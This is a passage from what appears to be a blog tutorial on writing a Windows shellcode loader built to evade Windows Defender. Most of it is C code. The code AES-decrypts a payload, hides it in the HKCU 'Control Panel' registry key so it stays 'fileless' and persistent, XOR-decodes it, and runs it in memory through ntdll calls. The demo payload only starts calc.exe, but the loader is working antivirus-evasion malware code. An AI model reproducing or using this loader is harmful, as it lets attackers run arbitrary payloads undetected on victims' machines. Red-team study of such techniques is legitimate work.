</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>status</span> <span class=o>=</span> <span class=nf>BCryptGenerateSymmetricKey</span><span class=p>(</span><span class=n>hAlgorithm</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>hKey</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=n>BYTE</span><span class=o>*</span><span class=p>)</span><span class=n>key</span><span class=p>,</span> <span class=n>AES_KEY_LENGTH</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>status</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>BCryptCloseAlgorithmProvider</span><span class=p>(</span><span class=n>hAlgorithm</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;BCryptGenerateSymmetricKey failed: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>status</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Get output buffer size
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>DWORD</span> <span class=n>cbPlaintext</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>status</span> <span class=o>=</span> <span class=nf>BCryptDecrypt</span><span class=p>(</span><span class=n>hKey</span><span class=p>,</span> <span class=p>(</span><span class=n>BYTE</span><span class=o>*</span><span class=p>)</span><span class=n>ciphertext</span><span class=p>,</span> <span class=n>ciphertextSize</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>cbPlaintext</span><span class=p>,</span> <span class=n>BCRYPT_BLOCK_PADDING</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>status</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>BCryptDestroyKey</span><span class=p>(</span><span class=n>hKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>BCryptCloseAlgorithmProvider</span><span class=p>(</span><span class=n>hAlgorithm</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;BCryptDecrypt size check failed: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>status</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Allocate plaintext buffer
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=o>*</span><span class=n>plaintext</span> <span class=o>=</span> <span class=p>(</span><span class=n>BYTE</span><span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=n>cbPlaintext</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!*</span><span class=n>plaintext</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>BCryptDestroyKey</span><span class=p>(</span><span class=n>hKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>BCryptCloseAlgorithmProvider</span><span class=p>(</span><span class=n>hAlgorithm</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Memory allocation failed</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Perform decryption
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>status</span> <span class=o>=</span> <span class=nf>BCryptDecrypt</span><span class=p>(</span><span class=n>hKey</span><span class=p>,</span> <span class=p>(</span><span class=n>BYTE</span><span class=o>*</span><span class=p>)</span><span class=n>ciphertext</span><span class=p>,</span> <span class=n>ciphertextSize</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>*</span><span class=n>plaintext</span><span class=p>,</span> <span class=n>cbPlaintext</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>plaintextSize</span><span class=p>,</span> <span class=n>BCRYPT_BLOCK_PADDING</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>status</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=o>*</span><span class=n>plaintext</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>BCryptDestroyKey</span><span class=p>(</span><span class=n>hKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>BCryptCloseAlgorithmProvider</span><span class=p>(</span><span class=n>hAlgorithm</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;BCryptDecrypt failed: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>status</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Cleanup
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>BCryptDestroyKey</span><span class=p>(</span><span class=n>hKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>BCryptCloseAlgorithmProvider</span><span class=p>(</span><span class=n>hAlgorithm</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>TRUE</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>However, even after <em>this</em>, we&rsquo;ll make one final effort to subvert Windows Defender—namely, by writing our encrypted payload to the Windows registry, so as to remain stealthy, fileless, and potentially persistent.</p><p>In other words: we’re never writing to disk. Our shellcode lives only in memory, getting decrypted and XOR-decoded on the fly before execution.</p><p>But how can we perform reads and writes against the Windows registry? We&rsquo;ll need to use the <code>winreg</code> API from Microsoft.<sup id=fnref:5><a href=#fn:5 class=footnote-ref role=doc-noteref>5</a></sup></p><p>First we&rsquo;ll make use of <code>RegOpenKeyExA</code> and <code>RegSetValueExA</code> since we want to write to the Window&rsquo;s registry. But we need somewhere to write! And we want to write to Control Panel, under the current running user&rsquo;s username.</p><p>So, before we read or write, we&rsquo;ll get the username from the current environment and append it to the write operation under the HKEY <code>Control Panel</code> &ndash; this way when we do write out, it will be within the registry key <code>\Control Panel\Username</code> under <code>HKEY_CURRENT_USER</code>.</p><p>And afterward, we use <code>RegQueryValueExA</code> to do the opposite operation, querying and reading the registry key we&rsquo;ve written.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=n>BOOL</span> <span class=nf>writeRegistry</span><span class=p>(</span><span class=k>const</span> <span class=n>BYTE</span><span class=o>*</span> <span class=n>data</span><span class=p>,</span> <span class=n>DWORD</span> <span class=n>dataSize</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>valueName</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>HKEY</span> <span class=n>hKey</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>LONG</span> <span class=n>status</span> <span class=o>=</span> <span class=nf>RegOpenKeyExA</span><span class=p>(</span><span class=n>HKEY_CURRENT_USER</span><span class=p>,</span> <span class=s>&#34;Control Panel&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>KEY_SET_VALUE</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>hKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>status</span> <span class=o>!=</span> <span class=n>ERROR_SUCCESS</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Error opening key: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>GetLastError</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>status</span> <span class=o>=</span> <span class=nf>RegSetValueExA</span><span class=p>(</span><span class=n>hKey</span><span class=p>,</span> <span class=n>valueName</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>REG_BINARY</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=n>dataSize</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>RegCloseKey</span><span class=p>(</span><span class=n>hKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>status</span> <span class=o>!=</span> <span class=n>ERROR_SUCCESS</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Error writing value: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>GetLastError</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>TRUE</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>BOOL</span> <span class=nf>readRegistry</span><span class=p>(</span><span class=n>BYTE</span><span class=o>**</span> <span class=n>buffer</span><span class=p>,</span> <span class=n>DWORD</span><span class=o>*</span> <span class=n>bytesRead</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>valueName</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>HKEY</span> <span class=n>hKey</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>LONG</span> <span class=n>status</span> <span class=o>=</span> <span class=nf>RegOpenKeyExA</span><span class=p>(</span><span class=n>HKEY_CURRENT_USER</span><span class=p>,</span> <span class=s>&#34;Control Panel&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>KEY_READ</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>hKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>status</span> <span class=o>!=</span> <span class=n>ERROR_SUCCESS</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Error opening key: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>GetLastError</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span> <span class=n>type</span><span class=p>,</span> <span class=n>size</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>status</span> <span class=o>=</span> <span class=nf>RegQueryValueExA</span><span class=p>(</span><span class=n>hKey</span><span class=p>,</span> <span class=n>valueName</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>type</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>status</span> <span class=o>!=</span> <span class=n>ERROR_SUCCESS</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>RegCloseKey</span><span class=p>(</span><span class=n>hKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Error querying value size: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>GetLastError</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>buffer</span> <span class=o>=</span> <span class=p>(</span><span class=n>BYTE</span><span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!*</span><span class=n>buffer</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>RegCloseKey</span><span class=p>(</span><span class=n>hKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Memory allocation failed</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>status</span> <span class=o>=</span> <span class=nf>RegQueryValueExA</span><span class=p>(</span><span class=n>hKey</span><span class=p>,</span> <span class=n>valueName</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>type</span><span class=p>,</span> <span class=o>*</span><span class=n>buffer</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>RegCloseKey</span><span class=p>(</span><span class=n>hKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>status</span> <span class=o>!=</span> <span class=n>ERROR_SUCCESS</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=o>*</span><span class=n>buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Error reading value: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>GetLastError</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>bytesRead</span> <span class=o>=</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>TRUE</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Before we wrap things up with our shellcode execution and main functions, we need a small gadget to decode the payload, since the payload in this script was one I XOR&rsquo;d beforehand.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>void</span> <span class=nf>XORDecode</span><span class=p>(</span><span class=n>BYTE</span><span class=o>*</span> <span class=n>data</span><span class=p>,</span> <span class=n>DWORD</span> <span class=n>dataSize</span><span class=p>,</span> <span class=n>BYTE</span> <span class=n>key</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>DWORD</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>dataSize</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^=</span> <span class=n>key</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Alright, now we&rsquo;re close. We need to make use of the type definitions for indirect syscalls we created earlier.</p><p>We get the function pointers to allocate and protect virtual memory, as well as to spin a new thread and wait for it to launch. And our epilogue will use the <code>NtFreeVirtualMemory</code> function to free our objects when we&rsquo;re done.</p><p>So, fundamentally what we&rsquo;re doing is dropping our now decrypted and XOR decoded shellcode into read-write-execute memory via ntdll calls for evasion. Lastly, our process spins up as a new thread in our current process&ndash;then we wait for it to finish.</p><p>And the resulting shellcode that&rsquo;s launched starts <code>calc.exe</code>, effectively forking off from our current process. After this, we clean up our memory and bail out cleanly.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>void</span> <span class=nf>ExecuteShellcode</span><span class=p>(</span><span class=n>BYTE</span><span class=o>*</span> <span class=n>shellcode</span><span class=p>,</span> <span class=n>SIZE_T</span> <span class=n>size</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>XORDecode</span><span class=p>(</span><span class=n>shellcode</span><span class=p>,</span> <span class=n>size</span><span class=p>,</span> <span class=sc>&#39;K&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Get function pointers
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>pNtAllocateVirtualMemory</span> <span class=n>NtAllocateVirtualMemory</span> <span class=o>=</span> <span class=p>(</span><span class=n>pNtAllocateVirtualMemory</span><span class=p>)</span><span class=nf>GetNtdllFunction</span><span class=p>(</span><span class=s>&#34;NtAllocateVirtualMemory&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>pNtProtectVirtualMemory</span> <span class=n>NtProtectVirtualMemory</span> <span class=o>=</span> <span class=p>(</span><span class=n>pNtProtectVirtualMemory</span><span class=p>)</span><span class=nf>GetNtdllFunction</span><span class=p>(</span><span class=s>&#34;NtProtectVirtualMemory&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>pNtCreateThreadEx</span> <span class=n>NtCreateThreadEx</span> <span class=o>=</span> <span class=p>(</span><span class=n>pNtCreateThreadEx</span><span class=p>)</span><span class=nf>GetNtdllFunction</span><span class=p>(</span><span class=s>&#34;NtCreateThreadEx&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>pNtWaitForSingleObject</span> <span class=n>NtWaitForSingleObject</span> <span class=o>=</span> <span class=p>(</span><span class=n>pNtWaitForSingleObject</span><span class=p>)</span><span class=nf>GetNtdllFunction</span><span class=p>(</span><span class=s>&#34;NtWaitForSingleObject&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>pNtFreeVirtualMemory</span> <span class=n>NtFreeVirtualMemory</span> <span class=o>=</span> <span class=p>(</span><span class=n>pNtFreeVirtualMemory</span><span class=p>)</span><span class=nf>GetNtdllFunction</span><span class=p>(</span><span class=s>&#34;NtFreeVirtualMemory&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>pNtClose</span> <span class=n>NtClose</span> <span class=o>=</span> <span class=p>(</span><span class=n>pNtClose</span><span class=p>)</span><span class=nf>GetNtdllFunction</span><span class=p>(</span><span class=s>&#34;NtClose&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>NtAllocateVirtualMemory</span> <span class=o>||</span> <span class=o>!</span><span class=n>NtProtectVirtualMemory</span> <span class=o>||</span> <span class=o>!</span><span class=n>NtCreateThreadEx</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>        <span class=o>!</span><span class=n>NtWaitForSingleObject</span> <span class=o>||</span> <span class=o>!</span><span class=n>NtFreeVirtualMemory</span> <span class=o>||</span> <span class=o>!</span><span class=n>NtClose</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Failed to get NTDLL function pointers</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>PVOID</span> <span class=n>execMemory</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>SIZE_T</span> <span class=n>regionSize</span> <span class=o>=</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>ULONG</span> <span class=n>oldProtect</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Allocate memory
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>NTSTATUS</span> <span class=n>status</span> <span class=o>=</span> <span class=nf>NtAllocateVirtualMemory</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=nf>GetCurrentProcess</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>        <span class=o>&amp;</span><span class=n>execMemory</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=o>&amp;</span><span class=n>regionSize</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>MEM_COMMIT</span> <span class=o>|</span> <span class=n>MEM_RESERVE</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>PAGE_READWRITE</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>status</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;NtAllocateVirtualMemory failed: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>status</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Copy shellcode
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>execMemory</span><span class=p>,</span> <span class=n>shellcode</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Change protection
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>status</span> <span class=o>=</span> <span class=nf>NtProtectVirtualMemory</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=nf>GetCurrentProcess</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>        <span class=o>&amp;</span><span class=n>execMemory</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=o>&amp;</span><span class=n>size</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>PAGE_EXECUTE_READ</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=o>&amp;</span><span class=n>oldProtect</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>status</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;NtProtectVirtualMemory failed: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>status</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>NtFreeVirtualMemory</span><span class=p>(</span><span class=nf>GetCurrentProcess</span><span class=p>(),</span> <span class=o>&amp;</span><span class=n>execMemory</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>size</span><span class=p>,</span> <span class=n>MEM_RELEASE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Create thread
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>HANDLE</span> <span class=n>hThread</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>status</span> <span class=o>=</span> <span class=nf>NtCreateThreadEx</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=o>&amp;</span><span class=n>hThread</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>THREAD_ALL_ACCESS</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nf>GetCurrentProcess</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=n>LPTHREAD_START_ROUTINE</span><span class=p>)</span><span class=n>execMemory</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nb>NULL</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>status</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;NtCreateThreadEx failed: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>status</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>NtFreeVirtualMemory</span><span class=p>(</span><span class=nf>GetCurrentProcess</span><span class=p>(),</span> <span class=o>&amp;</span><span class=n>execMemory</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>size</span><span class=p>,</span> <span class=n>MEM_RELEASE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Wait for thread
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>status</span> <span class=o>=</span> <span class=nf>NtWaitForSingleObject</span><span class=p>(</span><span class=n>hThread</span><span class=p>,</span> <span class=n>FALSE</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>status</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;NtWaitForSingleObject failed: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>status</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Cleanup
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>NtClose</span><span class=p>(</span><span class=n>hThread</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>NtFreeVirtualMemory</span><span class=p>(</span><span class=nf>GetCurrentProcess</span><span class=p>(),</span> <span class=o>&amp;</span><span class=n>execMemory</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>size</span><span class=p>,</span> <span class=n>MEM_RELEASE</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
